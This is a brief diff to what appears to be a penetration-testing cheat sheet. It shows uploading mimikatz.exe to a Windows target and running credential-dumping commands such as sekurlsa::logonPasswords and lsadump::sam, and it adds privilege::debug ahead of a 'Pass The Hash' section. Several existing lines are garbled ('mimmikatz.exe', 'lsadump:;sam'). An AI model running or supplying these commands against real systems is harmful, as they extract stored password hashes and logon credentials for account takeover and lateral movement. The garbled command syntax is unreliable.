@@ -316,6 +316,8 @@ upload /usr/share/windows-resources/mimikatz/<arh>/mimmikatz.exe
 ./mimikatz.exe
     lsadump:;sam
     sekurlsa:;logonPasswords
+    privilege::debug
+    lsadump::sam
 ```
 
 **4. Pass The Hash**
